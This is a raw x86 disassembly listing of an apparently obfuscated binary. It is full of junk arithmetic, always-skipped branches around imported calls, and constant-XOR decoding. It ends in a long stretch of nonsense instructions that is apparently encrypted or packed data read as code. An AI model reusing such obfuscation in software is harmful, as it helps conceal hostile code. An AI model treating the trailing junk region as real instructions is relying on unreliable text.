  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x4282bb,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x4283f7,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42828b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x4281eb,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x42834f
  415a48:	cmp    DWORD PTR ds:0x42828b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428f44
  415a74:	mov    edi,DWORD PTR ds:0x42821f
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x42823f
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x4281d7
  415a8f:	and    DWORD PTR ds:0x428403,edx
  415a95:	xor    DWORD PTR ds:0x4282a3,0x17b
  415a9f:	sbb    DWORD PTR ds:0x428357,ecx
  415aa5:	adc    DWORD PTR ds:0x4281cb,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x4281d3
  415ac7:	xor    DWORD PTR ds:0x4282ff,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x42824f
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x42830b
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x4283e3,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x4282af,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x42822f
  415b25:	mov    edx,DWORD PTR ds:0x42827f
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x4283ef,0x0
  415b3a:	not    DWORD PTR ds:0x428373
  415b40:	mov    DWORD PTR ds:0x4282cb,0x4d0
  415b4a:	mov    DWORD PTR ds:0x4281c3,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x4283d3,0x25ca
  415b63:	cmp    DWORD PTR ds:0x4283ef,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x4281bb
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428edc
  415b83:	add    DWORD PTR ds:0x4283cb,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x42837f,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x42834b
  415ba0:	adc    DWORD PTR ds:0x428387,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x4281df,0x0
  415bb5:	mov    DWORD PTR ds:0x4281d7,0x74bf
  415bbf:	mov    DWORD PTR ds:0x428357,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x4281df,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x4282b7
  415bef:	call   DWORD PTR ds:0x428ee0
  415bf5:	sub    edi,DWORD PTR ds:0x428403
  415bfb:	sbb    DWORD PTR ds:0x428387,ecx
  415c01:	and    edx,DWORD PTR ds:0x4281f7
  415c07:	mov    edi,DWORD PTR ds:0x42829f
  415c0d:	and    DWORD PTR ds:0x4281db,edi
  415c13:	or     DWORD PTR ds:0x4281d3,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x428203
  415c23:	mov    edx,DWORD PTR ds:0x42838b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x4283cf,0x0
  415c38:	mov    DWORD PTR ds:0x4283fb,ebx
  415c3e:	mov    DWORD PTR ds:0x4281cf,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x4281eb,edx
  415c4f:	cmp    DWORD PTR ds:0x4283cf,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x42836b
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428e30
  415c88:	mov    edi,DWORD PTR ds:0x428227
  415c8e:	mov    edx,DWORD PTR ds:0x4283af
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428387,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42829f
  415cab:	mov    eax,ds:0x422438
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x422658
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x4283eb,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x4282db
  415cd7:	mov    ebx,DWORD PTR ds:0x428403
  415cdd:	mov    DWORD PTR ds:0x4282a3,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x4283db,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x4283eb,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428e34
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x4282c7
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x4282df,0x4282c3
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x42836f,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428387,0x0
  415d58:	mov    DWORD PTR ds:0x4282e3,0x5216
  415d62:	not    DWORD PTR ds:0x4282bb
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x4282db,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x4282fb,ebx
  415d82:	cmp    DWORD PTR ds:0x428387,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x42811b
  415d94:	push   0x4280c9
  415d99:	call   DWORD PTR ds:0x428e38
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x4282df
  415dab:	sbb    DWORD PTR ds:0x428403,edx
  415db1:	or     DWORD PTR ds:0x4283e3,ebx
  415db7:	sbb    DWORD PTR ds:0x428303,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x42837f,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x4281bf,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x4281b7,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x4281fb,0x4281c3
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x4281fb,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x4283cf,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x4282d7,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x428303,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x4282af,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x4282df,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x428367,0x4281ef
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x4281d3,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x42837f,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x4281ef,0x1988
  415e9d:	mov    DWORD PTR ds:0x4282f7,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x4281d3,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428e3c
  415ec4:	or     DWORD PTR ds:0x428293,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x4283cb,0x174
  415ede:	mov    DWORD PTR ds:0x4283ef,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x4283eb
  415eee:	add    edx,DWORD PTR ds:0x4281cf
  415ef4:	mov    DWORD PTR ds:0x4283eb,edx
  415efa:	or     DWORD PTR ds:0x4283d7,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428387
  415f06:	or     DWORD PTR ds:0x4282e7,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x4282f7,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x42837f,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x4281b3,0x0
  415f3b:	mov    DWORD PTR ds:0x4281d7,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x4283d7
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x428377,ebx
  415f59:	cmp    DWORD PTR ds:0x4281b3,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428f48
  415f91:	xor    DWORD PTR ds:0x428407,edx
  415f97:	sbb    edi,DWORD PTR ds:0x4282e3
  415f9d:	sub    DWORD PTR ds:0x42829f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x4283db
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428383
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x4283d3,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x4281eb,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x4281eb
  415fdc:	add    DWORD PTR ds:0x4282d3,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42829f,0x0
  415fec:	mov    DWORD PTR ds:0x4283f3,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x428407,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x4283d3,0x1cd3
  416015:	mov    DWORD PTR ds:0x4281cf,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42829f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428f4c
  416037:	add    DWORD PTR ds:0x4281d3,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x428377,0x2c32
  416049:	and    edi,DWORD PTR ds:0x4282af
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x4282a7
  41605c:	adc    DWORD PTR ds:0x4282cb,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x4283fb,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x428367,0x4282df
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x4281ef,0x0
  416089:	mov    DWORD PTR ds:0x428387,0x1e83
  416093:	mov    DWORD PTR ds:0x4283e3,edx
  416099:	movzx  ecx,WORD PTR ds:0x4282bb
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x4281f3
  4160ad:	cmp    DWORD PTR ds:0x4281ef,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428e40
  4160c6:	adc    DWORD PTR ds:0x42837b,edi
  4160cc:	or     DWORD PTR ds:0x4282bb,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42828f
  4160dc:	sub    DWORD PTR ds:0x4281eb,ecx
  4160e2:	add    DWORD PTR ds:0x4282df,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x4225b8
  4160f5:	and    ecx,DWORD PTR ds:0x4282cf
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x4283db,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x4283f3,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x4281eb,0x0
  416120:	mov    DWORD PTR ds:0x4283d3,0x7b16
  41612a:	mov    DWORD PTR ds:0x4281ef,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x4282cb,0x5f2a
  416143:	cmp    DWORD PTR ds:0x4281eb,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428f50
  416159:	xor    DWORD PTR ds:0x4281c7,0x4281bb
  416163:	sub    DWORD PTR ds:0x4281b3,0x4281df
  41616d:	sbb    DWORD PTR ds:0x4282ef,0x4282e7
  416177:	and    DWORD PTR ds:0x4282df,0x56d1
  416181:	xor    DWORD PTR ds:0x4282cb,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x4282bf,0x4281fb
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x42826f
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x4281f3,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x4281eb,0x4282c7
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x4282eb,0x4282ab
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x428377,0x42828b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x4282e3,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	adc    cl,BYTE PTR [ebx+eax*4]
  416312:	jl     0x416308
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx-0x29e7e7ec],bl
  41631c:	or     eax,0x2e97dec5
  416321:	in     al,dx
  416322:	sbb    cl,0x60
  416325:	jns    0x4162cf
  416327:	out    0x4b,eax
  416329:	xlat   BYTE PTR ds:[ebx]
  41632a:	nop
  41632b:	add    al,0x5d
  41632d:	adc    BYTE PTR [ecx+0x2e92ede4],0x8a
  416334:	outs   dx,DWORD PTR ds:[esi]
  416335:	adc    eax,0xce08cdd6
  41633a:	push   es
  41633b:	jbe    0x4162ea
  41633d:	in     al,dx
  41633e:	aaa    
  41633f:	or     BYTE PTR [eax],0xe0
  416342:	add    ch,cl
  416344:	(bad)  
  416345:	inc    BYTE PTR [ebp-0x57853a25]
  41634b:	xchg   ebx,eax
  41634c:	mov    ch,0x69
  41634e:	add    BYTE PTR [edx-0xad17b2d],ch
  416354:	inc    esp
  416355:	sub    eax,DWORD PTR [ebx]
  416357:	cwde   
  416358:	add    bl,BYTE PTR [esi-0x6d]
  41635b:	inc    ecx
  41635c:	add    eax,0xa81c26bc
  416361:	addr16 retf 
  416363:	outs   dx,BYTE PTR ds:[esi]
  416364:	call   0xf36:0x9f5a45bf
  41636b:	nop
  41636c:	scas   eax,DWORD PTR es:[edi]
  41636d:	iret   
  41636e:	lahf   
  41636f:	adc    eax,0x4796e004
  416374:	add    al,0x8e
  416376:	xor    BYTE PTR [edi+0x77020c65],ch
  41637c:	icebp  
  41637d:	das    
  41637e:	xchg   esi,eax
  41637f:	es test al,0xbc
  416382:	arpl   di,si
  416384:	mov    bh,0x1e
  416386:	jns    0x416366
  416388:	aam    0x40
  41638a:	mov    esi,0x4a5dac79
  41638f:	mov    ebp,0x51b24280
  416394:	enter  0x16cf,0x42
  416398:	mov    ah,0xd7
  41639a:	xchg   esp,eax
  41639b:	fsubr  st,st(7)
  41639d:	adc    BYTE PTR [ebp+ebx*2+0x72],al
  4163a1:	add    edx,DWORD PTR [eax-0x2]
  4163a4:	mov    dh,al
  4163a6:	mov    eax,0xf84270c1
  4163ab:	xchg   ebx,eax
  4163ac:	retf   0x532f
  4163af:	adc    eax,0x388ba8f6
  4163b4:	sbb    BYTE PTR [ebx-0x47],0xfa
  4163b8:	push   edi
  4163b9:	outs   dx,BYTE PTR ds:[esi]
  4163ba:	sbb    bh,dh
  4163bc:	jns    0x41637b
  4163be:	dec    ebx
  4163bf:	popf   
  4163c0:	jmp    0x4163d6
  4163c2:	xor    eax,0x8d266e4d
  4163c7:	or     dl,BYTE PTR [ebx]
  4163c9:	mov    dl,0xe3
  4163cb:	sbb    DWORD PTR [esi+ebx*1+0x4d8ffc68],edi
  4163d2:	mov    esp,0xbd8e6b62
  4163d7:	add    ah,BYTE PTR [esi]
  4163d9:	test   ch,ch
  4163db:	lods   al,BYTE PTR ds:[esi]
  4163dc:	jge    0x4163e6
  4163de:	inc    eax
  4163df:	mov    eax,ds:0x118d0173
  4163e4:	hlt    
  4163e5:	mov    eax,0x10100608
  4163ea:	or     DWORD PTR [eax-0x74],ebp
  4163ed:	mov    bh,0x32
  4163ef:	sbb    edi,DWORD PTR [ebx+0x1e]
  4163f2:	data16 out dx,al
  4163f4:	pop    ds
  4163f5:	test   ebp,0x66b45dc8
  4163fb:	fist   DWORD PTR [ebx+0x6086e6d5]
  416401:	or     eax,0xdcea62fb
  416406:	hlt    
  416407:	cli    
  416408:	or     eax,0xae841cc7
  41640d:	shl    DWORD PTR [ecx-0x7f],0x25
  416411:	cdq    
  416412:	xor    bl,BYTE PTR [eax-0xc]
  416415:	int3   
  416416:	data16 (bad) 
  416418:	mov    ecx,0x4d08f101
  41641d:	adc    DWORD PTR [ecx],eax
  41641f:	loope  0x4163c6
  416421:	mov    esp,0xa0bdca8
  416426:	pop    edi
  416427:	mov    esp,0xfe1449d1
  41642c:	sti    
  41642d:	push   eax
  41642e:	add    DWORD PTR [esi],0xbe008247
  416434:	jae    0x41649c
  416436:	and    DWORD PTR [edx],ecx
  416438:	aam    0x80
  41643a:	cmp    BYTE PTR [ebp-0x3ebd1f17],cl
  416440:	outs   dx,DWORD PTR ds:[esi]
  416441:	inc    edi
  416442:	cmp    al,0xb8
  416444:	xor    BYTE PTR [edx],al
  416446:	cmp    BYTE PTR [ebp-0x5c7cf3f2],dh
  41644c:	repnz mov ecx,0x1c24d5ce
  416452:	ins    DWORD PTR es:[edi],dx
  416453:	adc    BYTE PTR [edx-0x2123271c],dh
  416459:	shl    DWORD PTR [ebx],0x90
  41645c:	in     eax,dx
  41645d:	in     eax,0x8e
  41645f:	ret    
  416460:	clc    
  416461:	les    ebx,FWORD PTR [ebp+0x6931e43d]
  416467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416468:	fbstp  TBYTE PTR [edx+0x46]
  41646b:	add    bl,BYTE PTR ds:0x152d7c3
  416471:	add    ebp,DWORD PTR [esi]
  416473:	mov    esi,0xd235cef7
  416478:	or     al,0xd2
  41647a:	adc    BYTE PTR [ebp+0x40],ch
  41647d:	imul   esp,DWORD PTR [esi],0x69960217
  416483:	dec    ebp
  416484:	pushf  
  416485:	rol    DWORD PTR [ebx+0x5d],0x6
  416489:	das    
  41648a:	xor    DWORD PTR [eax+0xc],esi
  41648d:	xchg   DWORD PTR [ebx],ebp
  41648f:	jb     0x4164e7
  416491:	out    dx,al
  416492:	retf   0x532
  416495:	sub    ah,BYTE PTR [ebx-0x8]
  416498:	adc    al,0x98
  41649a:	cmp    bl,BYTE PTR [eax-0x63772174]
  4164a0:	sub    DWORD PTR [ebp+0x7],ecx
  4164a3:	fcomp  QWORD PTR [ecx+edi*8+0x55]
  4164a7:	inc    esp
  4164a8:	loope  0x4164dc
  4164aa:	out    dx,eax
  4164ab:	mov    eax,0x24b05b23
  4164b0:	dec    ecx
  4164b1:	and    cl,BYTE PTR [eax]
  4164b3:	scas   eax,DWORD PTR es:[edi]
  4164b4:	pushf  
  4164b5:	cmp    ebp,esp
  4164b7:	ret    0xb6ec
  4164ba:	jg     0x416493
  4164bc:	das    
  4164bd:	popf   
  4164be:	fistp  QWORD PTR [eax+0x30]
  4164c1:	mov    edi,DWORD PTR [ecx]
  4164c3:	lods   eax,DWORD PTR ds:[esi]
  4164c4:	inc    edi
  4164c5:	fs mov edx,0xb4b731a
  4164cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164cc:	ret    
  4164cd:	xchg   edi,ebx
  4164cf:	test   DWORD PTR [edx+0x6a],ebx
  4164d2:	call   0xe6e8:0x6da9e457
  4164d9:	mov    dl,0x14
  4164db:	outs   dx,BYTE PTR ds:[esi]
  4164dc:	clc    
  4164dd:	jmp    0x12bc:0xa3de773c
  4164e4:	jns    0x41653c
  4164e6:	clc    
  4164e7:	adc    al,0x2f
  4164e9:	outs   dx,BYTE PTR ds:[esi]
